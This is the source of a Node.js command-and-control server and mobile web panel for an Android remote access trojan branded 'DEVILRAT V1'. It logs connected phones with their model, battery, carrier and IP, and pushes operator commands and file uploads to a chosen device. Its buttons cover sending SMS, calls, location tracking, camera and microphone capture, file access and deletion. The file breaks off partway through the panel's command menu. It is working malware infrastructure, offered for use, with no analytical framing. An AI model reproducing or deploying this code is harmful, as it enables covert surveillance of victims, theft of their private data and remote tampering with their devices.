const express = require('express');
const webSocket = require('ws');
const http = require('http');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const clients = new Map();

const upload = multer();
app.use(bodyParser.json());
app.use(express.static('public'));

// DEVIL THEME CONFIG
const THEME = {
  name: "DEVILRAT V1",
  color: "#8B0000",
  bg: "#0A0A0A",
  accent: "#FF0000"
};

// WebSocket Connection
wss.on('connection', (ws, req) => {
  const uuid = uuidv4();
  const deviceInfo = {
    model: req.headers.model || "Unknown",
    battery: req.headers.battery || "Unknown",
    version: req.headers.version || "Unknown",
    brightness: req.headers.brightness || "Unknown",
    provider: req.headers.provider || "Unknown",
    ip: req.socket.remoteAddress,
    connected: new Date().toLocaleString(),
    lastSeen: new Date().toLocaleString()
  };

  ws.uuid = uuid;
  clients.set(uuid, { ws, ...deviceInfo });

  // Broadcast new connection to all web clients
  broadcastToWeb({
    type: 'device_connected',
    uuid: uuid,
    data: deviceInfo
  });

  ws.on('message', (message) => {
    const data = JSON.parse(message);
    
    // Broadcast device response to web
    broadcastToWeb({
      type: 'device_response',
      uuid: uuid,
      data: data
    });
  });

  ws.on('close', () => {
    const device = clients.get(uuid);
    if (device) {
      broadcastToWeb({
        type: 'device_disconnected',
        uuid: uuid,
        data: device
      });
      clients.delete(uuid);
    }
  });
});

// Web Client Connection
const webClients = new Set();

// Broadcast to all web clients
function broadcastToWeb(data) {
  const message = JSON.stringify(data);
  webClients.forEach(client => {
    if (client.readyState === webSocket.OPEN) {
      client.send(message);
    }
  });
}

// WebSocket for Web Clients
const webWss = new webSocket.Server({ port: 8080 });
webWss.on('connection', (ws) => {
  webClients.add(ws);
  
  // Send current device list to new web client
  const deviceList = [];
  clients.forEach((device, uuid) => {
    deviceList.push({
      uuid,
      model: device.model,
      battery: device.battery,
      version: device.version,
      ip: device.ip,
      connected: device.connected
    });
  });
  
  ws.send(JSON.stringify({
    type: 'init',
    theme: THEME,
    devices: deviceList
  }));

  ws.on('message', (message) => {
    const command = JSON.parse(message);
    
    if (command.type === 'send_command') {
      const targetClient = clients.get(command.deviceUuid);
      if (targetClient && targetClient.ws.readyState === webSocket.OPEN) {
        targetClient.ws.send(JSON.stringify(command.data));
        
        // Log the command
        broadcastToWeb({
          type: 'command_sent',
          uuid: command.deviceUuid,
          command: command.data,
          timestamp: new Date().toLocaleString()
        });
      }
    }
  });

  ws.on('close', () => {
    webClients.delete(ws);
  });
});

// API Endpoints
app.post("/api/uploadFile", upload.single('file'), (req, res) => {
  const deviceUuid = req.headers.deviceuuid;
  const targetClient = clients.get(deviceUuid);
  
  if (targetClient && targetClient.ws.readyState === webSocket.OPEN) {
    targetClient.ws.send(JSON.stringify({
      type: 'upload_file',
      filename: req.file.originalname,
      data: req.file.buffer.toString('base64')
    }));
  }
  res.json({ status: 'uploaded' });
});

app.post("/api/command", (req, res) => {
  const { deviceUuid, command, params } = req.body;
  const targetClient = clients.get(deviceUuid);
  
  if (targetClient && targetClient.ws.readyState === webSocket.OPEN) {
    targetClient.ws.send(JSON.stringify({
      type: 'command',
      command: command,
      params: params
    }));
    
    broadcastToWeb({
      type: 'command_log',
      uuid: deviceUuid,
      command: command,
      params: params,
      timestamp: new Date().toLocaleString()
    });
  }
  res.json({ status: 'command_sent' });
});

app.get("/api/devices", (req, res) => {
  const deviceList = [];
  clients.forEach((device, uuid) => {
    deviceList.push({
      uuid,
      model: device.model,
      battery: device.battery,
      version: device.version,
      brightness: device.brightness,
      provider: device.provider,
      ip: device.ip,
      connected: device.connected,
      lastSeen: device.lastSeen
    });
  });
  res.json(deviceList);
});

// Main Route - Mobile Optimized Web Panel
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>${THEME.name}</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background: ${THEME.bg};
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow-x: hidden;
            min-height: 100vh;
            padding-bottom: 80px;
        }
        
        .devil-header {
            background: linear-gradient(135deg, #450000, ${THEME.color});
            padding: 20px;
            text-align: center;
            border-bottom: 3px solid ${THEME.accent};
            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .devil-title {
            font-size: 2em;
            font-weight: bold;
            text-shadow: 0 0 10px ${THEME.accent};
            letter-spacing: 2px;
        }
        
        .devil-subtitle {
            font-size: 0.9em;
            opacity: 0.8;
            margin-top: 5px;
        }
        
        .stats-bar {
            display: flex;
            justify-content: space-around;
            background: #1A1A1A;
            padding: 15px;
            margin: 10px;
            border-radius: 10px;
            border: 1px solid ${THEME.color};
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-value {
            font-size: 1.5em;
            color: ${THEME.accent};
            font-weight: bold;
        }
        
        .device-list {
            padding: 10px;
        }
        
        .device-card {
            background: #1A1A1A;
            border-radius: 10px;
            padding: 15px;
            margin: 10px 0;
            border-left: 5px solid ${THEME.accent};
            box-shadow: 0 3px 10px rgba(0,0,0,0.5);
            transition: transform 0.3s;
        }
        
        .device-card:active {
            transform: scale(0.98);
        }
        
        .device-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .device-model {
            font-weight: bold;
            font-size: 1.2em;
        }
        
        .device-status {
            background: #00AA00;
            color: white;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8em;
        }
        
        .device-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            font-size: 0.9em;
            opacity: 0.8;
        }
        
        .control-panel {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(26, 26, 26, 0.95);
            backdrop-filter: blur(10px);
            border-top: 2px solid ${THEME.accent};
            padding: 15px;
            z-index: 1000;
        }
        
        .command-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
        }
        
        .command-btn {
            background: ${THEME.color};
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-weight: bold;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 0.9em;
        }
        
        .command-btn:active {
            background: ${THEME.accent};
            transform: scale(0.95);
        }
        
        .danger-btn {
            background: #8B0000;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.9);
            z-index: 2000;
            padding: 20px;
            overflow-y: auto;
        }
        
        .modal-content {
            background: ${THEME.bg};
            border-radius: 15px;
            padding: 20px;
            border: 2px solid ${THEME.accent};
            max-width: 500px;
            margin: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid ${THEME.color};
        }
        
        .modal-title {
            font-size: 1.3em;
            font-weight: bold;
            color: ${THEME.accent};
        }
        
        .close-modal {
            background: ${THEME.color};
            color: white;
            border: none;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            font-size: 1.2em;
            cursor: pointer;
        }
        
        .input-group {
            margin-bottom: 15px;
        }
        
        .input-label {
            display: block;
            margin-bottom: 5px;
            color: #CCC;
        }
        
        .input-field {
            width: 100%;
            padding: 12px;
            background: #1A1A1A;
            border: 1px solid ${THEME.color};
            border-radius: 8px;
            color: white;
            font-size: 1em;
        }
        
        .execute-btn {
            width: 100%;
            background: ${THEME.accent};
            color: white;
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1.1em;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .logs-container {
            max-height: 300px;
            overflow-y: auto;
            background: #1A1A1A;
            border-radius: 8px;
            padding: 10px;
            margin-top: 10px;
            border: 1px solid ${THEME.color};
        }
        
        .log-item {
            padding: 8px;
            border-bottom: 1px solid #333;
            font-family: monospace;
            font-size: 0.9em;
        }
        
        .log-time {
            color: #888;
            font-size: 0.8em;
        }
        
        .log-command {
            color: ${THEME.accent};
        }
        
        @media (min-width: 768px) {
            body {
                max-width: 500px;
                margin: 0 auto;
                border-left: 1px solid ${THEME.color};
                border-right: 1px solid ${THEME.color};
            }
        }
    </style>
</head>
<body>
    <div class="devil-header">
        <div class="devil-title">${THEME.name}</div>
        <div class="devil-subtitle">DARKNESS CONTROL PANEL</div>
    </div>
    
    <div class="stats-bar">
        <div class="stat-item">
            <div class="stat-value" id="connectedCount">0</div>
            <div>CONNECTED</div>
        </div>
        <div class="stat-item">
            <div class="stat-value" id="totalDevices">0</div>
            <div>DEVICES</div>
        </div>
        <div class="stat-item">
            <div class="stat-value" id="activeCommands">0</div>
            <div>COMMANDS</div>
        </div>
    </div>
    
    <div class="device-list" id="deviceList">
        <!-- Devices will be loaded here -->
    </div>
    
    <div class="control-panel">
        <div class="command-grid">
            <button class="command-btn" onclick="openCommandModal('sms')">📱 SMS</button>
            <button class="command-btn" onclick="openCommandModal('call')">📞 CALL</button>
            <button class="command-btn" onclick="openCommandModal('location')">📍 LOC</button>
            <button class="command-btn" onclick="openCommandModal('camera')">📸 CAM</button>
            <button class="command-btn" onclick="openCommandModal('mic')">🎤 MIC</button>
            <button class="command-btn" onclick="openCommandModal('file')">📁 FILE</button>
            <button class="command-btn danger-btn" onclick="openCommandModal('vibrate')">📳 VIBE</button>
            <button class="command-btn" onclick="openCommandModal('toast')">💬 TOAST</button>
            <button class="command-btn danger-btn" onclick="openCommandModal('delete')">🗑️ DELETE</button>
        </div>
    </div>
    
    <!-- Command Modal -->
    <div class="modal" id="commandModal">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title" id="modalTitle">COMMAND</div>
                <button class="close-modal" onclick="closeModal()">×</button>
            </div>
            
            <div id="modalContent">
                <!-- Dynamic content -->
            </div>
            
            <div class="logs-container" id="commandLogs">
                <!-- Command logs -->
            </div>
        </div>
    </div>

    <script>
        let currentDevice = null;
        let ws = null;
        let commandCount = 0;
        
        // Connect to WebSocket
        function connectWebSocket() {
            ws = new WebSocket('ws://' + window.location.hostname + ':8080');
            
            ws.onopen = function() {
                console.log('Connected to DEVILRAT server');
            };
            
            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                
                switch(data.type) {
                    case 'init':
                        updateDeviceList(data.devices);
                        break;
                    
                    case 'device_connected':
                        addDevice(data);
                        break;
                    
                    case 'device_disconnected':
                        removeDevice(data.uuid);
                        break;
                    
                    case 'device_response':
                        addLog(data.uuid, 'Response: ' + JSON.stringify(data.data));
                        break;
                    
                    case 'command_sent':
                        commandCount++;
                        updateStats();
                        addLog(data.uuid, 'Command sent: ' + data.command);
                        break;
                    
                    case 'command_log':
                        addLog(data.uuid, 'Executed: ' + data.command);
                        break;
                }
            };
            
            ws.onclose = function() {
                setTimeout(connectWebSocket, 3000);
            };
        }
        
        function updateDeviceList(devices) {
            const deviceList = document.getElementById('deviceList');
            deviceList.innerHTML = '';
            
            devices.forEach(device => {
                deviceList.innerHTML += \`
                    <div class="device-card" onclick="selectDevice('\${device.uuid}')">
                        <div class="device-header">
                            <div class="device-model">\${device.model}</div>
                            <div class="device-status">ONLINE</div>
                        </div>
                        <div class="device-info">
                            <div>🔋 \${device.battery}</div>
                            <div>📱 v\${device.version}</div>
                            <div>🌐 \${device.ip}</div>
                            <div>🕒 \${device.connected}</div>
                        </div>
                    </div>
                \`;
            });
            
            updateStats();
        }
        
        function addDevice(data) {
            const device = data.data;
            const deviceList = document.getElementById('deviceList');
            
            deviceList.innerHTML = \`
                <div class="device-card" onclick="selectDevice('\${data.uuid}')">
                    <div class="device-header">
                        <div class="device-model">\${device.model}</div>
                        <div class="device-status">NEW</div>
                    </div>
                    <div class="device-info">
                        <div>🔋 \${device.battery}</div>
                        <div>📱 v\${device.version}</div>
                        <div>🌐 \${device.ip}</div>
                        <div>🕒 \${device.connected}</div>
                    </div>
                </div>
            \` + deviceList.innerHTML;
            
            updateStats();
        }
        
        function removeDevice(uuid) {
            const cards = document.querySelectorAll('.device-card');
            cards.forEach(card => {
                if (card.onclick.toString().includes(uuid)) {
                    card.remove();
                }
            });
            updateStats();
        }
        
        function selectDevice(uuid) {
            currentDevice = uuid;
            document.querySelectorAll('.device-card').forEach(card => {
                card.style.borderLeft = '5px solid #8B0000';
            });
            
            const selectedCard = document.querySelector(\`[onclick*="\${uuid}"]\`);
            if (selectedCard) {
                selectedCard.style.borderLeft = '5px solid #00FF00';
            }
            
            openCommandModal('quick');
        }
        
        function openCommandModal(type) {
            if (!currentDevice) {
                alert('Select a device first!');
                return;
            }
            
            const modal = document.getElementById('commandModal');
            const modalContent = document.getElementById('modalContent');
            const modalTitle = document.getElementById('modalTitle');
            
            let content = '';
            let title = '';
            
            switch(type) {
                case 'sms':
                    title = 'SEND SMS';
                    content = \`
                        <div class="input-group">
                            <label class="input-label">Phone Number:</label>
                            <input type="text" class="input-field" id="smsNumber" placeholder="+1234567890">
                        </div>
                        <div class="input-group">
                            <label class="input-label">Message:</label>
                            <textarea class="input-field" id="smsMessage" rows="3" placeholder="Type message..."></textarea>
                        </div>
                        <button class="execute-btn" onclick="sendSMS()">SEND SMS</button>
                    \`;
                    break;
                    
                case 'location':
                    title = 'GET LOCATION';
                    content = \`
                        <button class="execute-btn" onclick="sendCommand('get_location')">GET CURRENT LOCATION</button>
                    \`;
                    break;
                    
                case 'camera'
